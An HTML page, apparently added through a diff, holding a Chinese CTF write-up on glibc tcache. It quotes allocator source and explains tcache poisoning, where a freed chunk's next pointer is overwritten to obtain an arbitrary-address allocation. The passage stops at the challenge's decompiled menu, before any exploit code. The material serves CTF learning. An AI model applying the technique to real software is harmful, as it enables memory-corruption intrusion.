tMi44LTE2LjItNy0yMC05LjYtMTEuNC03LjYtMTcuNi05LjItNDguOC0xMi40LTI3LjYtMi44LTU2LjYtMy40LTczLjItMS42em0zOS40IDQ0LjRjMTEuMiAyLjIgMjIuNiA1IDI1IDYuNCA3IDMuNiAyNiAyMS44IDMwLjggMjkuNCA4LjYgMTMuNCAxMSA1NCA0LjYgNzctMi42IDkuNi0xOC44IDI3LjYtMzkuNCA0NC4yLTE1LjYgMTIuNC0xNyAxMy0yOS44IDE0LTcuNi44LTIyLjQgMi4yLTMzIDMuNi0yMi42IDIuNi00NS42IDEtNTMuOC0zLjgtMy4yLTItOC02LjgtMTAuOC0xMC44LTIuNi00LjItOC40LTEwLjQtMTIuOC0xMy44LTguMi02LjgtMTMuNC0xNi40LTE5LjQtMzctMy44LTEzLjItMi44LTIxLjggNS4yLTQ3LjYgMy4yLTEwLjQgNi0xNC42IDE3LjQtMjUuOCAxMi40LTEyLjIgMjMuOC0yMi4yIDMzLjItMjkuNiA0LTMgMzguNi05LjQgNTMuNC05LjggNSAwIDE4LjIgMS42IDI5LjQgMy42eiIvPjxwYXRoIGQ9Ik0zODcuMiA2MDZjLTEyLjIgMy44LTE4LjIgMTMuNC0xNSAyNC42IDUuOCAyMS4yIDI3LjggMjUuOCA0MC42IDguNiA2LjYtOC44IDcuOC0xNi4yIDQuMi0yNC00LjgtMTAuMi0xNS40LTEzLjQtMjkuOC05LjJ6Ii8+PC9zdmc+);
+    }
+    
+    
+    
+    
+    
+    
+    .footer-sns-zhihu {
+        background-image: url(data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI0OCIgaGVpZ2h0PSI0OCIgY2xhc3M9Imljb24iIHZpZXdCb3g9IjAgMCAxMDI0IDEwMjQiPjxwYXRoIGQ9Ik0xMzYuOCA3OC44Yy04LjYgMi44LTI0IDEyLjQtMzMuNiAyMS04LjYgNy44LTIxLjQgMjcuOC0yNC40IDM3LjgtNC4yIDE0LTQgNzIzLjQgMCA3MzMuNCA4LjYgMjAuNiAzNi44IDQ4LjYgNTYgNTUuNiA5IDMuNCA3NDcuNCAzLjQgNzU2LjQgMCAxOS44LTcuMiA0OS0zNi42IDU2LTU2LjIgMi4yLTYgMi42LTc1LjYgMi44LTM2Ni40IDAtMjMzLjgtLjYtMzYxLjQtMi0zNjYtMS4yLTMuOC02LjYtMTMuOC0xMi4yLTIyLjItOC4yLTEyLjItMTMuNC0xNy40LTI1LjgtMjUuNi04LjQtNS44LTE5LTExLjQtMjMuMi0xMi4yLTQuNi0xLjItMTYzLjItMS44LTM3NC44LTEuOC0yOTMgMC0zNjguNi42LTM3NS4yIDIuNnptMTkwIDE0NS42YzUuNCA3LjYgNCAxNy40LTQuOCAzMS42LTkuOCAxNi0xMC44IDI3LjQtMyAzNSAyLjYgMi44IDYuNCA1IDguNCA1czM3LjguNCA3OS42LjZjNjggLjQgNzYuNi44IDgyLjQgMy44IDkuMiA1IDEyLjYgMTEgMTIuNiAyMiAwIDctMS4yIDEwLjgtNC44IDE1bC00LjggNS40LTM4IC4yYy01My44IDAtNTMuOCAwLTU1LjQgNTEuMi0uNiAxOC0xLjYgNDIuOC0yLjIgNTUtMS4yIDIyLjguNiAzMS42IDcuNiAzNi4yIDEuNC44IDIyLjIgMiA0NiAyLjZsNDMuMiAxIDguOCA2YzE1LjQgMTAuOCAxNy44IDI5LjIgNSAzNy01LjggMy42LTEwLjIgNC01MS44IDQtMzEgMC00NyAuOC01MC42IDIuNC03IDMuMi0xNC4yIDE3LjYtMTcuMiAzNC40LTMuMiAxNi42LTEgMjEuOCA5LjYgMjUuMiAxMy40IDQuMiAyMS44IDExLjIgNDkgNDEuNCAzNSAzOC44IDM2LjYgNDEgNDEuOCA1OC44IDcgMjMuOCAyLjIgNDEuOC0xMS40IDQxLjgtNy42IDAtMTItMy0yMS0xNC42LTEzLjgtMTcuNC01NC40LTY1LjgtNjItNzMuOC0xNS4yLTE2LTI5LjQtNS44LTM4LjggMjcuNC0xLjggNi42LTguOCAyMy4yLTE1LjYgMzctMTAuOCAyMi0xNCAyNi44LTI3LjQgMzkuNi0xOS42IDE5LjItMjYuNCAyMy01My42IDI5LjYtMjcuMiA2LjQtMzcgNS42LTM4LTMuNi0xLTguNCA0LjQtMTYuNCAyMC0yOSAxNi0xMyAzNi44LTM2LjYgNDUuMi01MS40IDMtNS4yIDguMi0xMy44IDExLjYtMTkgMy40LTUgMTEuOC0yMC40IDE4LjYtMzQuMiAxMC0yMCAxMy42LTI5LjQgMTcuMi00NyAyLjYtMTIuMiA2LjItMjUuNCA3LjgtMjkuNCA0LTkuNCA0LTIxLjQuMi0yNy01LjItNy40LTE2LTguOC02Mi42LTguNC01MC40LjQtNTUuMi0uOC01Ny42LTEzLjItMS44LTEwLjQgNS44LTI0LjQgMTYuMi0yOS44IDcuNC0zLjggMTEuOC00LjIgNTYuMi00LjhsNDguNC0uOCA0LjYtNWM0LjgtNSA0LjgtNSA1LTYxLjYgMC0zNS4yLS44LTU5LjItMi02My4yLTMuOC0xMS4yLTExLTE0LjgtMzAuMi0xNC44cy0yMS40IDEuNC0zMS4yIDE4LjJjLTguMiAxNC40LTIwLjYgMjguOC0zMy4yIDM4LjgtMTMuMiAxMC40LTIxLjYgMTMtMjggOS04LjQtNS42LTUuMi0yMy4yIDguMi00My4yIDQtNi40IDkuMi0xOC42IDEyLjItMjkuNiAzLTEwLjIgNy40LTIzLjIgMTAtMjkgMi40LTUuNiA2LTE2LjggOC0yNC42IDUuNi0yMy42IDI0LTUwLjggMzkuNC01OC40IDExLjItNS40IDE4LjYtNS40IDIyLjQuMnptNDUyIDY4LjJjMTEuOCA3LjggMTEuNC0uOCAxMC44IDIxNi0uNiAxODEtLjggMTk4LjgtNCAyMDMtNy42IDEwLjgtOS44IDExLjQtNTMuNiAxMi40bC00MSAxLTE0IDcuOGMtNy42IDQuMi0yMS4yIDEzLTI5LjggMTkuNC0yNS44IDE5LjItMzUgMTkuOC00My40IDMuMi0xMS44LTIzLjItMjMuNi0zMy4yLTM5LjQtMzMuNC04LjggMC0xMy42LTIuOC0xNy4yLTkuOC0yLjYtNC44LTMtMzMuOC0yLjYtMjA4LjguNC0xOTkuOC40LTIwMyA0LjQtMjA3LjQgMi4yLTIuNCA1LjgtNS4yIDgtNi4yIDIuMi0uOCA1MS44LTEuNCAxMTAtMS4yIDk5IC40IDEwNi42LjYgMTExLjggNHoiLz48cGF0aCBkPSJNNjA2LjggMzM3LjRjLTIuNC40LTYuNCAzLTkgNS44bC00LjggNS4yLS42IDE1Ni40LS40IDE1Ni40IDYuNCA5LjRjMy42IDUuMiA5LjggMTUuMiAxMy42IDIxLjggOCAxNC4yIDE2LjggMjAuNiAyNS42IDE4LjYgMy4yLS42IDEzLjgtNyAyMy42LTE0LjIgMjMtMTcgMjcuOC0xOSA1MC4yLTIwLjIgMTYuNC0xIDE5LjItMS44IDIzLjYtNi4yIDIuOC0yLjggNS02LjQgNS4yLTguMlY1MDUuNmMwLTExNi0uNi0xNTQuNC0yLjYtMTU4LjYtNC44LTEwLjQtOC40LTExLTcwLTEwLjgtMzEuMi4yLTU4LjYuOC02MC44IDEuMnoiLz48L3N2Zz4=);
+    }
+    
+    
+    
+</style>
+
+        
+        <!-- Config CSS -->
+
+<!-- Other Styles -->
+<style>
+  body, html {
+    font-family: Roboto, "Helvetica Neue", Helvetica, "PingFang SC", "Hiragino Sans GB", "Microsoft YaHei", "微软雅黑", Arial, sans-serif;
+  }
+
+  a {
+    color: #00838F;
+  }
+
+  .mdl-card__media,
+  #search-label,
+  #search-form-label:after,
+  #scheme-Paradox .hot_tags-count,
+  #scheme-Paradox .sidebar_archives-count,
+  #scheme-Paradox .sidebar-colored .sidebar-header,
+  #scheme-Paradox .sidebar-colored .sidebar-badge{
+    background-color: #0097A7 !important;
+  }
+
+  /* Sidebar User Drop Down Menu Text Color */
+  #scheme-Paradox .sidebar-colored .sidebar-nav>.dropdown>.dropdown-menu>li>a:hover,
+  #scheme-Paradox .sidebar-colored .sidebar-nav>.dropdown>.dropdown-menu>li>a:focus {
+    color: #0097A7 !important;
+  }
+
+  #post_entry-right-info,
+  .sidebar-colored .sidebar-nav li:hover > a,
+  .sidebar-colored .sidebar-nav li:hover > a i,
+  .sidebar-colored .sidebar-nav li > a:hover,
+  .sidebar-colored .sidebar-nav li > a:hover i,
+  .sidebar-colored .sidebar-nav li > a:focus i,
+  .sidebar-colored .sidebar-nav > .open > a,
+  .sidebar-colored .sidebar-nav > .open > a:hover,
+  .sidebar-colored .sidebar-nav > .open > a:focus,
+  #ds-reset #ds-ctx .ds-ctx-entry .ds-ctx-head a {
+    color: #0097A7 !important;
+  }
+
+  .toTop {
+    background: #757575 !important;
+  }
+
+  .material-layout .material-post>.material-nav,
+  .material-layout .material-index>.material-nav,
+  .material-nav a {
+    color: #757575;
+  }
+
+  #scheme-Paradox .MD-burger-layer {
+    background-color: #757575;
+  }
+
+  #scheme-Paradox #post-toc-trigger-btn {
+    color: #757575;
+  }
+
+  .post-toc a:hover {
+    color: #00838F;
+    text-decoration: underline;
+  }
+
+</style>
+
+
+<!-- Theme Background Related-->
+
+    <style>
+      body {
+        background-color: #F5F5F5;
+      }
+
+      /* blog_info bottom background */
+      #scheme-Paradox .material-layout .something-else .mdl-card__supporting-text {
+        background-color: #fff;
+      }
+    </style>
+
+
+
+
+<!-- Fade Effect -->
+
+    <style>
+      .fade {
+        transition: all 800ms linear;
+        -webkit-transform: translate3d(0,0,0);
+        -moz-transform: translate3d(0,0,0);
+        -ms-transform: translate3d(0,0,0);
+        -o-transform: translate3d(0,0,0);
+        transform: translate3d(0,0,0);
+        opacity: 1;
+      }
+
+      .fade.out{
+        opacity: 0;
+      }
+    </style>
+
+
+<!-- Import Font -->
+
+    <link href="https://fonts.googleapis.com/css?family=Roboto:300,400,500" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/icon?family=Material+Icons"rel="stylesheet">
+
+
+        <script>lsloader.load("js/jquery.min.js","/js/jquery.min.js?qcusAULNeBksqffqUM2+Ig==")</script>
+    
+    
+    <script>function Queue(){this.dataStore=[];this.offer=b;this.poll=d;this.execNext=a;this.debug=false;this.startDebug=c;function b(e){if(this.debug){console.log("Offered a Queued Function.")}if(typeof e==="function"){this.dataStore.push(e)}else{console.log("You must offer a function.")}}function d(){if(this.debug){console.log("Polled a Queued Function.")}return this.dataStore.shift()}function a(){var e=this.poll();if(e!==undefined){if(this.debug){console.log("Run a Queued Function.")}e()}}function c(){this.debug=true}}var queue=new Queue();</script>
+
+    <!-- Analytics -->
+    
+
+    <!-- Custom Head -->
+    
+<link rel="stylesheet" href="/css/prism-ghcolors.css" type="text/css"></head>
+
+
+    
+        <body id="scheme-Paradox" class="lazy">
+            <div class="material-layout  mdl-js-layout has-drawer is-upgraded">
+                
+
+                <!-- Main Container -->
+                <main class="material-layout__content" id="main">
+
+                    <!-- Top Anchor -->
+                    <div id="top"></div>
+
+                    
+                        <!-- Hamburger Button -->
+                        <button class="MD-burger-icon sidebar-toggle">
+                            <span class="MD-burger-layer"></span>
+                        </button>
+                    
+
+                    <!-- Post TOC -->
+
+    
+    <!-- Back Button -->
+    <!--
+    <div class="material-back" id="backhome-div" tabindex="0">
+        <a class="mdl-button mdl-js-button mdl-js-ripple-effect mdl-button--icon"
+           href="#" onclick="window.history.back();return false;"
+           target="_self"
+           role="button"
+           data-upgraded=",MaterialButton,MaterialRipple">
+            <i class="material-icons" role="presentation">arrow_back</i>
+            <span class="mdl-button__ripple-container">
+                <span class="mdl-ripple"></span>
+            </span>
+        </a>
+    </div>
+    -->
+
+    <!-- Left aligned menu below button -->
+    <button id="post-toc-trigger-btn"
+        class="mdl-button mdl-js-button mdl-button--icon">
+        <i class="material-icons">format_list_numbered</i>
+    </button>
+
+    
+    <ul class="post-toc-wrap mdl-menu mdl-menu--bottom-left mdl-js-menu mdl-js-ripple-effect" for="post-toc-trigger-btn" style="max-height:80vh; overflow-y:scroll;">
+        <ol class="post-toc"><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#Tcache-struct"><span class="post-toc-number">1.</span> <span class="post-toc-text">Tcache struct</span></a></li></ol></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#Tcache-get-Tcache-put"><span class="post-toc-number"></span> <span class="post-toc-text">Tcache_get/Tcache-put</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#tcache-poisoning"><span class="post-toc-number">1.</span> <span class="post-toc-text">tcache_poisoning</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#题目分析"><span class="post-toc-number">2.</span> <span class="post-toc-text">### 题目分析</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#creat-size"><span class="post-toc-number">3.</span> <span class="post-toc-text">creat_size</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#delete"><span class="post-toc-number">4.</span> <span class="post-toc-text">delete</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#print-all"><span class="post-toc-number">5.</span> <span class="post-toc-text">print_all</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#developer"><span class="post-toc-number">6.</span> <span class="post-toc-text">developer</span></a></li></ol></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#思路"><span class="post-toc-number"></span> <span class="post-toc-text">思路</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#1、how-to-leak"><span class="post-toc-number">1.</span> <span class="post-toc-text">1、how to leak</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-5"><a class="post-toc-link" href="#exp"><span class="post-toc-number">1.1.</span> <span class="post-toc-text">exp</span></a></li><li class="post-toc-item post-toc-level-5"><a class="post-toc-link" href="#调式结果"><span class="post-toc-number">1.2.</span> <span class="post-toc-text">调式结果</span></a></li></ol></li></ol></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#这里需要掌握的知识"><span class="post-toc-number"></span> <span class="post-toc-text">这里需要掌握的知识</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#how-to-leak-libc"><span class="post-toc-number">1.</span> <span class="post-toc-text">how to leak libc</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-5"><a class="post-toc-link" href="#leak-libc"><span class="post-toc-number">1.1.</span> <span class="post-toc-text">leak libc</span></a></li><li class="post-toc-item post-toc-level-5"><a class="post-toc-link" href="#one-gadget"><span class="post-toc-number">1.2.</span> <span class="post-toc-text">one_gadget</span></a></li></ol></li></ol></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#exp编写"><span class="post-toc-number"></span> <span class="post-toc-text">exp编写</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#run"><span class="post-toc-number">1.</span> <span class="post-toc-text">run</span></a></li></ol>
+        <!--
+        <li class="mdl-menu__item">
+            Some Action
+        </li>
+        -->
+    </ul>
+    
+
+
+
+
+
+<!-- Layouts -->
+
+    <!-- Post Module -->
+    <div class="material-post_container">
+
+        <div class="material-post mdl-grid">
+            <div class="mdl-card mdl-shadow--4dp mdl-cell mdl-cell--12-col">
+
+                <!-- Post Header(Thumbnail & Title) -->
+                
+    <!-- Paradox Post Header -->
+    
+        
+            <!-- Random Thumbnail -->
+            <div class="post_thumbnail-random mdl-card__media mdl-color-text--grey-50">
+            <script type="text/ls-javascript" id="post-thumbnail-script">
+    var randomNum = Math.floor(Math.random() * 19 + 1);
+
+    $('.post_thumbnail-random').attr('data-original', '/img/random/material-' + randomNum + '.png');
+    $('.post_thumbnail-random').addClass('lazy');
+</script>
+
+        
+    
+            <p class="article-headline-p">
+                Tcache学习-god-the-reum
+            </p>
+        </div>
+
+
+
+
+
+                
+                    <!-- Paradox Post Info -->
+                    <div class="mdl-color-text--grey-700 mdl-card__supporting-text meta">
+
+    <!-- Author Avatar -->
+    <div id="author-avatar">
+        <img src="/img/avatar.png" width="44px" height="44px" alt="Author Avatar"/>
+    </div>
+    <!-- Author Name & Date -->
+    <div>
+        <strong>iosmosis</strong>
+        <span>3月 04, 2019</span>
+    </div>
+
+    <div class="section-spacer"></div>
+
+    <!-- Favorite -->
+    <!--
+        <button id="article-functions-like-button" class="mdl-button mdl-js-button mdl-js-ripple-effect mdl-button--icon btn-like">
+            <i class="material-icons" role="presentation">favorite</i>
+            <span class="visuallyhidden">favorites</span>
+        </button>
+    -->
+
+    <!-- Qrcode -->
+    
+        <button id="article-functions-qrcode-button" class="mdl-button mdl-js-button mdl-js-ripple-effect mdl-button--icon">
+    <i class="material-icons" role="presentation">devices other</i>
+    <span class="visuallyhidden">devices other</span>
+</button>
+<ul class="mdl-menu mdl-menu--bottom-right mdl-js-menu mdl-js-ripple-effect" for="article-functions-qrcode-button">
+    <li class="mdl-menu__item">在其它设备中阅读本文章</li>
+    
+        <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAPYAAAD2CAAAAADAeSUUAAAC3UlEQVR42u3aUZLaMBAEUO5/6eQACaZ75E2M9PRFsWDreauY0vS8fh25XtjY2NjY2NjY2NiPZL/i9ee33l3hL7eMr3P9emnP2NjY2FuzP/z0l5t7d/vkoaxc59qFjY2NfQJ7fbvXZSzfdHLfds/Y2NjY2EnJaWEfSg42NjY29g+w8wPDrCWUH1GwsbGxsZcaNCNq3kK6jhb+Qy8NGxsb+/HsPDR9zut/mm9jY2NjP5g9W+2YzsrIzl0LGxsbe1f2bPwxuUL+1/YBDUMFbGxs7IPZszbTykBPUhTrfwA2Njb2AezkCJEz8tGfddiwl4aNjY29Bfv6EvnxYxbTzspeGzxjY2Njn8C+Bt8bxCYPZXYU+aDAxsbGPoadb2g2djkrn23DCxsbG/scdjIck+PzmLYNdNudFEEvNjY29pezV8LU2ZoN8bQtJGxsbOzT2LNRm7x9n8fAs2g5KqLY2NjYW7PbJtFs0CcPhttvRRZsbGzsTdltwZiFBCsPaPbgsLGxsc9ktwMxs1K0UgjzxxGlItjY2NhbsPMANd96W65mn6ljCWxsbOwD2G1TqW0htc2slVZUnYpgY2Njfzn7rkJ13VRK3m/LYTFshI2Njb01e+VI0Db0oy2OCurSUQQbGxv7a9ntMSAvM0lA28YGSbRcBL3Y2NjYW7A//OiX4zjXB4bZO21IgI2NjX0aOy9gbft+ZaBndjj5cEdsbGzsTdkrDf31YHjWkBrGydjY2NibsvMGUPJ+Gxu3BS//PDY2NvY57HbdO46TBw9JKa2PItjY2NhbsGflZNayX3nQyaGljgewsbGxN2Kvx70/PdCTt7fefhIbGxv7AHbeuF8pV23zqD1yDHtp2NjY2MewW8AsPMiLaHEcwsbGxsYui9NdkUNbDuumEjY2NvZG7LaplB9I2uZRXg5vKGDY2NjYW7DzoHdlpOauNlYeP2NjY2OfwD5nYWNjY2NjY2NjYz9m/Qb5wCCCY5uaIQAAAABJRU5ErkJggg==">
+    
+</ul>
+    
+
+    <!-- Tags (bookmark) -->
+    
+    <button id="article-functions-viewtags-button" class="mdl-button mdl-js-button mdl-js-ripple-effect mdl-button--icon">
+        <i class="material-icons" role="presentation">bookmark</i>
+        <span class="visuallyhidden">bookmark</span>
+    </button>
+    <ul class="mdl-menu mdl-menu--bottom-right mdl-js-menu mdl-js-ripple-effect" for="article-functions-viewtags-button">
+        <li class="mdl-menu__item">
+        
+    </ul>
+    
+
+    <!-- Share -->
+    <button id="article-fuctions-share-button" class="mdl-button mdl-js-button mdl-js-ripple-effect mdl-button--icon">
+    <i class="material-icons" role="presentation">share</i>
+    <span class="visuallyhidden">share</span>
+</button>
+<ul class="mdl-menu mdl-menu--bottom-right mdl-js-menu mdl-js-ripple-effect" for="article-fuctions-share-button">
+    
+
+    
+
+    <!-- Share Weibo -->
+    
+        <a class="post_share-link" href="http://service.weibo.com/share/share.php?appkey=&title=Tcache学习-god-the-reum&url=http://iosmosis.github.io/2019/03/04/Tcache学习-god-the-reum/index.html&pic=&searchPic=false&style=simple" target="_blank">
+            <li class="mdl-menu__item">
+                分享到微博
+            </li>
+        </a>
+    
+
+    <!-- Share Twitter -->
+    
+        <a class="post_share-link" href="https://twitter.com/intent/tweet?text=Tcache学习-god-the-reum&url=http://iosmosis.github.io/2019/03/04/Tcache学习-god-the-reum/index.html&via=iosmosis" target="_blank">
+            <li class="mdl-menu__item">
+                分享到 Twitter
+            </li>
+        </a>
+    
+
+    <!-- Share Facebook -->
+    
+
+    <!-- Share Google+ -->
+    
+
+    <!-- Share LinkedIn -->
+    
+
+    <!-- Share QQ -->
+    
+
+    <!-- Share Telegram -->
+    
+</ul>
+
+</div>
+
+                
+
+                <!-- Post Content -->
+                <div id="post-content" class="mdl-color-text--grey-700 mdl-card__supporting-text fade out">
+    
+        <h4 id="Tcache-struct"><a href="#Tcache-struct" class="headerlink" title="Tcache struct"></a>Tcache struct</h4><p></p><p class="code-caption" data-lang="c" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
+<pre class=" language-c"><code class="language-c"><span class="token keyword">typedef</span> <span class="token keyword">struct</span> tcache_entry
+<span class="token punctuation">{</span>
+  <span class="token keyword">struct</span> tcache_entry <span class="token operator">*</span>next<span class="token punctuation">;</span>
+<span class="token punctuation">}</span> tcache_entry<span class="token punctuation">;</span>
+
+<span class="token comment" spellcheck="true">/* There is one of these for each thread, which contains the per-thread cache (hence "tcache_perthread_struct").  Keeping overall size low is mildly important.  Note that COUNTS and ENTRIES are redundant (we could have just counted the linked list each time), this is for performance reasons.  */</span>
+<span class="token keyword">typedef</span> <span class="token keyword">struct</span> tcache_perthread_struct
+<span class="token punctuation">{</span>
+  <span class="token keyword">char</span> counts<span class="token punctuation">[</span>TCACHE_MAX_BINS<span class="token punctuation">]</span><span class="token punctuation">;</span>
+  tcache_entry <span class="token operator">*</span>entries<span class="token punctuation">[</span>TCACHE_MAX_BINS<span class="token punctuation">]</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span> tcache_perthread_struct<span class="token punctuation">;</span>
+
+<span class="token keyword">static</span> __thread tcache_perthread_struct <span class="token operator">*</span>tcache <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>
+</code></pre>
+<h3 id="Tcache-get-Tcache-put"><a href="#Tcache-get-Tcache-put" class="headerlink" title="Tcache_get/Tcache-put"></a>Tcache_get/Tcache-put</h3><p></p><p class="code-caption" data-lang="c" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
+<pre class=" language-c"><code class="language-c"><span class="token keyword">static</span> <span class="token keyword">void</span>
+<span class="token function">tcache_put</span> <span class="token punctuation">(</span>mchunkptr chunk<span class="token punctuation">,</span> size_t tc_idx<span class="token punctuation">)</span>
+<span class="token punctuation">{</span>
+  tcache_entry <span class="token operator">*</span>e <span class="token operator">=</span> <span class="token punctuation">(</span>tcache_entry <span class="token operator">*</span><span class="token punctuation">)</span> <span class="token function">chunk2mem</span> <span class="token punctuation">(</span>chunk<span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token function">assert</span> <span class="token punctuation">(</span>tc_idx <span class="token operator">&lt;</span> TCACHE_MAX_BINS<span class="token punctuation">)</span><span class="token punctuation">;</span>
+  e<span class="token operator">-></span>next <span class="token operator">=</span> tcache<span class="token operator">-></span>entries<span class="token punctuation">[</span>tc_idx<span class="token punctuation">]</span><span class="token punctuation">;</span>
+  tcache<span class="token operator">-></span>entries<span class="token punctuation">[</span>tc_idx<span class="token punctuation">]</span> <span class="token operator">=</span> e<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//增加到链表头部</span>
+  <span class="token operator">++</span><span class="token punctuation">(</span>tcache<span class="token operator">-></span>counts<span class="token punctuation">[</span>tc_idx<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">//记录当前 bin 的 chunk数</span>
+<span class="token punctuation">}</span>
+
+<span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token operator">*</span>
+<span class="token function">tcache_get</span> <span class="token punctuation">(</span>size_t tc_idx<span class="token punctuation">)</span>
+<span class="token punctuation">{</span>
+  tcache_entry <span class="token operator">*</span>e <span class="token operator">=</span> tcache<span class="token operator">-></span>entries<span class="token punctuation">[</span>tc_idx<span class="token punctuation">]</span><span class="token punctuation">;</span>
+  <span class="token function">assert</span> <span class="token punctuation">(</span>tc_idx <span class="token operator">&lt;</span> TCACHE_MAX_BINS<span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token function">assert</span> <span class="token punctuation">(</span>tcache<span class="token operator">-></span>entries<span class="token punctuation">[</span>tc_idx<span class="token punctuation">]</span> <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  tcache<span class="token operator">-></span>entries<span class="token punctuation">[</span>tc_idx<span class="token punctuation">]</span> <span class="token operator">=</span> e<span class="token operator">-></span>next<span class="token punctuation">;</span>
+  <span class="token operator">--</span><span class="token punctuation">(</span>tcache<span class="token operator">-></span>counts<span class="token punctuation">[</span>tc_idx<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span> e<span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+</code></pre>
+<p>tcache_put</p>
+<p>用于把一个 <code>chunk</code> 放到 指定的 <code>tcache-&gt;entries</code> 里面去， <code>tc_idx</code> 通过 <code>csize2tidx (nb)</code> 计算得到 （<code>nb</code>是 <code>chunk</code> 的大小）。</p>
+<p>它首先把 <code>chunk+2*SIZE_SZ</code> （就是除去 <code>header</code> 部分） 强制转换成 <code>tcache_entry *</code> 类型，然后插入到 <code>tcache-&gt;entries[tc_idx]</code> 的首部，最后把 <code>tcache-&gt;counts[tc_idx]</code> 加 <code>1</code> ，表示新增了一个 <code>chunk</code> 到 该 表项。</p>
+<p>tcache_get</p>
+<p>根据 <code>tc_idx</code> 取出 <code>tcache-&gt;entries[tc_idx]</code> 的第一个<code>chunk</code> ， 然后把 指针强制转换为 <code>(void *)</code></p>
+<p>仅仅检查了 tc_idx 并无做更多检查 可以将 tcache 当作一个类似于 fastbin 的单独链表，只是它的 check，并没有 fastbin 那么复杂。</p>
+<h4 id="tcache-poisoning"><a href="#tcache-poisoning" class="headerlink" title="tcache_poisoning"></a>tcache_poisoning</h4><p></p><p class="code-caption" data-lang="" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
+<pre><code>通过修改 free 状态的 tcache 里面的 chunk 的 fd （其实就是 tcache_entry-&gt;next ) ，可以分配到任意地址
+
+tache posioning 和 fastbin attack类似，而且限制更加少，不会检查size。
+</code></pre><p>一个 tcache bin 中的最大块数<code>mp_.tcache_count</code>是<code>7</code></p>
+<p></p><p class="code-caption" data-lang="c" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
+<pre class=" language-c"><code class="language-c"><span class="token comment" spellcheck="true">/* This is another arbitrary limit, which tunables can change.  Each
+   tcache bin will hold at most this number of chunks.  */</span>
+<span class="token macro property"># <span class="token directive keyword">define</span> TCACHE_FILL_COUNT 7</span>
+<span class="token macro property">#<span class="token directive keyword">endif</span></span>
+</code></pre>
+<p>具体知识点参考阅读</p>
+<p>  <a href="https://www.secpulse.com/archives/71958.html" target="_blank" rel="external">https://www.secpulse.com/archives/71958.html</a></p>
+<p> <a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/tcache_attack/#tcache-poisoning" target="_blank" rel="external">https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/tcache_attack/#tcache-poisoning</a></p>
+<h4 id="题目分析"><a href="#题目分析" class="headerlink" title="### 题目分析"></a>### 题目分析</h4><p></p><p class="code-caption" data-lang="c" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
+<pre class=" language-c"><code class="language-c"><span class="token keyword">case</span> <span class="token number">1u</span><span class="token punctuation">:</span>
+       v3 <span class="token operator">=</span> <span class="token operator">&amp;</span>v5<span class="token punctuation">[</span><span class="token number">16</span> <span class="token operator">*</span> dword_20202C<span class="token punctuation">]</span><span class="token punctuation">;</span>
+       <span class="token function">create_size</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token operator">*</span><span class="token punctuation">)</span>v3<span class="token punctuation">)</span><span class="token punctuation">;</span>
+       <span class="token keyword">break</span><span class="token punctuation">;</span>
+     <span class="token keyword">case</span> <span class="token number">2u</span><span class="token punctuation">:</span>
+       v3 <span class="token operator">=</span> <span class="token operator">&amp;</span>v5<span class="token punctuation">[</span><span class="token number">16</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token keyword">signed</span> <span class="token keyword">int</span><span class="token punctuation">)</span><span class="token function">sub_11DC</span><span class="token punctuation">(</span>v3<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+       <span class="token function">save</span><span class="token punctuation">(</span><span class="token punctuation">(</span>__int64<span class="token punctuation">)</span>v3<span class="token punctuation">)</span><span class="token punctuation">;</span>
